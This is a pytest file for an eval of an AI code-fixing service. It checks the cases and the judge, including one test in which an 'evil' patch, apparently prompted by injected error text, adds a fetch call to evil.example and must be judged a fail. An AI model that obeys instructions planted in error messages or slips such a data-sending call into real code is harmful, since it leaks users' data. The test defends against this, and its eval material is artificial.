"""The eval itself is not run in CI (it calls the provider), but its cases and its judge must be
sound, or a good model could fail them, or a bad one pass."""

import pytest

from app.fixes.edits import find_edit_problem
from app.fixes.stub import StubFixProposer
from app.schemas.fix import FixEdit, FixOutput, FixResponse
from evals.fix_cases import CASES, FixCase
from evals.run_fix import judge

FIXABLE = [c for c in CASES if c.expect_fixable]
NOT_FIXABLE = [c for c in CASES if not c.expect_fixable]


def answer(case: FixCase, search: str, replace: str) -> FixResponse:
    return FixResponse(
        fixable=True,
        pr_title="t",
        explanation="e",
        confidence="high",
        edits=[FixEdit(file=case.request.files[0].file, search=search, replace=replace)],
        reason="",
        prompt_version="p",
        model="m",
    )


def test_there_are_twelve_cases_with_unique_names() -> None:
    assert len(CASES) == 12
    assert len({c.name for c in CASES}) == 12
    assert len(NOT_FIXABLE) >= 3  # declining is part of the job


@pytest.mark.parametrize("case", CASES, ids=lambda c: c.name)
def test_the_failing_line_is_inside_the_window(case: FixCase) -> None:
    window = case.request.files[0]
    lines = window.code.rstrip("\n").split("\n")
    assert window.start_line <= window.failing_line <= window.start_line + len(lines) - 1


@pytest.mark.parametrize("case", FIXABLE, ids=lambda c: c.name)
def test_a_fixable_case_has_a_check_and_the_unpatched_code_fails_it(case: FixCase) -> None:
    window = case.request.files[0]
    assert case.check is not None
    assert not case.check(window.code)


@pytest.mark.parametrize("case", CASES, ids=lambda c: c.name)
async def test_the_stub_is_judged_wrong_on_every_case(case: FixCase) -> None:
    # A comment is a valid patch and never a fix: the judge must not be fooled by it.
    stub = await StubFixProposer().propose(case.request)
    if stub.fixable:
        assert find_edit_problem(case.request, stub) is None
    assert judge(case, stub).verdict == "fail"


def test_the_judge_accepts_a_real_fix_and_a_refusal() -> None:
    case = next(c for c in CASES if c.name == "off-by-one")
    good = answer(case, "i <= items.length", "i < items.length")
    assert judge(case, good).verdict == "pass"

    declined = next(c for c in NOT_FIXABLE)
    refusal = FixResponse(
        **FixOutput(
            fixable=False,
            pr_title="",
            explanation="",
            confidence="low",
            edits=[],
            reason="Not a code bug.",
        ).model_dump(),
        prompt_version="p",
        model="m",
    )
    assert judge(declined, refusal).verdict == "pass"


def test_the_judge_rejects_a_patch_that_adds_what_the_error_text_asked_for() -> None:
    case = next(c for c in CASES if c.name == "injection-in-message")
    evil = answer(
        case,
        "  return account.email;",
        "  fetch('https://evil.example/collect');\n  return account?.email;",
    )
    assert judge(case, evil).verdict == "fail"
